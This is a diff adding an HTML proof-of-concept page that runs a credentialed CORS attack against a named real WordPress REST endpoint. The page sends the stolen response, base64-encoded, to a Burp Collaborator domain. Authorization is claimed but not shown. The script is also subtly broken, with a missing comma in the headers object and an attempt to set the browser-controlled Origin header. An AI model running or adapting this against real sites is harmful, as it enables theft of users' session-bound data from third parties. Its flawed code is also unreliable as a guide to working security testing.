@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>CORS PoC - thebeacon.ymcahk.org.hk/wp-json/</title>
+    <style>
+        body { font-family: Arial, sans-serif; padding: 30px; background: #f9f9f9; }
+        button { font-size: 18px; padding: 12px 24px; background: #d32f2f; color: white; border: none; cursor: pointer; }
+        pre { background: #1e1e1e; color: #00ff00; padding: 15px; overflow: auto; margin-top: 20px; white-space: pre-wrap; }
+    </style>
+</head>
+<body>
+    <h1>CORS Proof-of-Concept (Authorized Testing)</h1>
+    <p><strong>Target Endpoint:</strong> https://thebeacon.ymcahk.org.hk/wp-json/</p>
+    <p><strong>Status:</strong> Authorized Engagement Only</p>
+
+    <button onclick="runCORSExfil()">🚀 Trigger CORS Attack + Exfil to Collaborator</button>
+
+    <pre id="output">Click the button to start the test...</pre>
+
+    <script>
+    // ================== CONFIGURATION ==================
+    const targetEndpoint = "https://thebeacon.ymcahk.org.hk/wp-json/";
+    const collaboratorDomain = "lk958fimkz1akxl8c1huorhqnht8h75w.oastify.com";   // ← REPLACE WITH YOUR REAL COLLABORATOR DOMAIN
+    // ===================================================
+
+    function runCORSExfil() {
+        const output = document.getElementById("output");
+        output.textContent = "[+] Sending CORS request to /wp-json/ with credentials...\n\n";
+
+        fetch(targetEndpoint, {
+            method: "GET",
+            credentials: "include",          // Important: sends cookies/session
+            headers: {
+                "Accept": "application/json"
+                "Origin": "https://github.com/"
+            }
+        })
+        .then(response => {
+            output.textContent += `Response Status: ${response.status}\n`;
+            output.textContent += `Access-Control-Allow-Origin: ${response.headers.get("Access-Control-Allow-Origin") || "Not present"}\n`;
+            output.textContent += `Access-Control-Allow-Credentials: ${response.headers.get("Access-Control-Allow-Credentials") || "Not present"}\n\n`;
+            return response.text();
+        })
+        .then(data => {
+            output.textContent += "[+] Successfully received data from /wp-json/\n";
+            output.textContent += "[+] Exfiltrating response to Burp Collaborator...\n\n";
+
+            // Exfiltrate the full response (base64 encoded)
+            const exfilData = btoa(unescape(encodeURIComponent(data)));
+            const exfilUrl = `https://${collaboratorDomain}/?wpjson_exfil=` + encodeURIComponent(exfilData);
+
+            fetch(exfilUrl, { method: "GET", mode: "no-cors" });
+
+            output.textContent += "[+] Exfiltration completed!\n";
+            output.textContent += "→ Check your Burp Collaborator tab now (look for HTTP interaction with 'wpjson_exfil=')";
+        })
+        .catch(err => {
+            output.textContent += "[-] Error: " + err.message;
+        });
+    }
+    </script>
+</body>
+</html>
